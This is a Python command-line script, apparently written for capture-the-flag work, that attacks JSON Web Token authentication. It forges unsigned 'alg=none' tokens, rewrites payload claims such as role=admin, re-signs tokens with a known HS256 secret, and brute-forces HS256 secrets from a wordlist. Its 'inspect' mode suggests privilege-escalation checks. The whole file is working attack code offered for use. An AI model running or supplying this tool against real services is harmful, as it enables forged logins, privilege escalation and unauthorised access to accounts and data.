#!/usr/bin/env python3
from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
from pathlib import Path


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def b64url_decode(value: str) -> bytes:
    padding = "=" * (-len(value) % 4)
    return base64.urlsafe_b64decode((value + padding).encode("ascii"))


def decode_token(token: str) -> tuple[dict, dict, bytes]:
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("JWT must contain exactly three dot-separated parts")
    header = json.loads(b64url_decode(parts[0]).decode("utf-8"))
    payload = json.loads(b64url_decode(parts[1]).decode("utf-8"))
    signature = b64url_decode(parts[2]) if parts[2] else b""
    return header, payload, signature


def encode_token(header: dict, payload: dict, signature: bytes) -> str:
    header_part = b64url_encode(json.dumps(header, separators=(",", ":"), sort_keys=True).encode("utf-8"))
    payload_part = b64url_encode(json.dumps(payload, separators=(",", ":"), sort_keys=True).encode("utf-8"))
    signature_part = b64url_encode(signature) if signature else ""
    return f"{header_part}.{payload_part}.{signature_part}"


def sign_hs256(header: dict, payload: dict, secret: str) -> str:
    signed_header = dict(header)
    signed_header["alg"] = "HS256"
    signing_input = (
        b64url_encode(json.dumps(signed_header, separators=(",", ":"), sort_keys=True).encode("utf-8"))
        + "."
        + b64url_encode(json.dumps(payload, separators=(",", ":"), sort_keys=True).encode("utf-8"))
    )
    signature = hmac.new(secret.encode("utf-8"), signing_input.encode("ascii"), hashlib.sha256).digest()
    return f"{signing_input}.{b64url_encode(signature)}"


def verify_hs256(token: str, secret: str) -> bool:
    parts = token.split(".")
    if len(parts) != 3:
        return False
    signing_input = f"{parts[0]}.{parts[1]}".encode("ascii")
    expected = hmac.new(secret.encode("utf-8"), signing_input, hashlib.sha256).digest()
    try:
        supplied = b64url_decode(parts[2])
    except Exception:
        return False
    return hmac.compare_digest(expected, supplied)


def make_none_token(header: dict, payload: dict) -> str:
    none_header = dict(header)
    none_header["alg"] = "none"
    return encode_token(none_header, payload, b"")


def apply_updates(payload: dict, updates: list[str]) -> dict:
    new_payload = dict(payload)
    for item in updates:
        if "=" not in item:
            raise ValueError(f"Invalid --set value: {item}")
        key, raw_value = item.split("=", 1)
        lowered = raw_value.lower()
        if lowered in {"true", "false"}:
            value = lowered == "true"
        else:
            try:
                value = int(raw_value)
            except ValueError:
                value = raw_value
        new_payload[key] = value
    return new_payload


def inspect_token(token: str) -> dict:
    header, payload, signature = decode_token(token)
    alg = header.get("alg", "<missing>")
    suspicious_headers = [name for name in ("kid", "jku", "jwk", "x5u", "x5c") if name in header]
    recommended_checks: list[str] = []

    if alg == "none":
        recommended_checks.append("Server may accept unsigned tokens")
    if alg.startswith("HS"):
        recommended_checks.append("Check for weak shared secrets and re-signing opportunities")
    if suspicious_headers:
        recommended_checks.append("Inspect header-driven key selection fields")
    if any(key in payload for key in ("role", "admin", "scope", "is_admin")):
        recommended_checks.append("Change the smallest authorization claim and re-test one protected endpoint")

    return {
        "header": header,
        "payload": payload,
        "signature_length": len(signature),
        "recommended_checks": recommended_checks,
    }


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Inspect and mutate JWTs for CTF triage.")
    subparsers = parser.add_subparsers(dest="command", required=True)

    inspect_parser = subparsers.add_parser("inspect", help="Decode a token and suggest likely checks")
    inspect_parser.add_argument("--token", required=True)

    none_parser = subparsers.add_parser("make-none", help="Create an alg=none token from an existing token")
    none_parser.add_argument("--token", required=True)
    none_parser.add_argument("--set", action="append", default=[], help="Update payload fields, e.g. role=admin")

    resign_parser = subparsers.add_parser("resign-hs256", help="Re-sign a token with a provided HS256 secret")
    resign_parser.add_argument("--token", required=True)
    resign_parser.add_argument("--secret", required=True)
    resign_parser.add_argument("--set", action="append", default=[], help="Update payload fields, e.g. role=admin")

    brute_parser = subparsers.add_parser("bruteforce-hs256", help="Try an HS256 wordlist against a token")
    brute_parser.add_argument("--token", required=True)
    brute_parser.add_argument("--wordlist", required=True)

    return parser.parse_args()


def main() -> int:
    args = parse_args()

    if args.command == "inspect":
        print(json.dumps(inspect_token(args.token), ensure_ascii=False, indent=2))
        return 0

    if args.command == "make-none":
        header, payload, _ = decode_token(args.token)
        print(make_none_token(header, apply_updates(payload, args.set)))
        return 0

    if args.command == "resign-hs256":
        header, payload, _ = decode_token(args.token)
        print(sign_hs256(header, apply_updates(payload, args.set), args.secret))
        return 0

    if args.command == "bruteforce-hs256":
        token = args.token
        for candidate in Path(args.wordlist).read_text(encoding="utf-8").splitlines():
            secret = candidate.strip()
            if not secret:
                continue
            if verify_hs256(token, secret):
                print(json.dumps({"secret": secret}, ensure_ascii=False))
                return 0
        print(json.dumps({"secret": None}, ensure_ascii=False))
        return 1

    raise ValueError(f"Unhandled command: {args.command}")


if __name__ == "__main__":
    raise SystemExit(main())
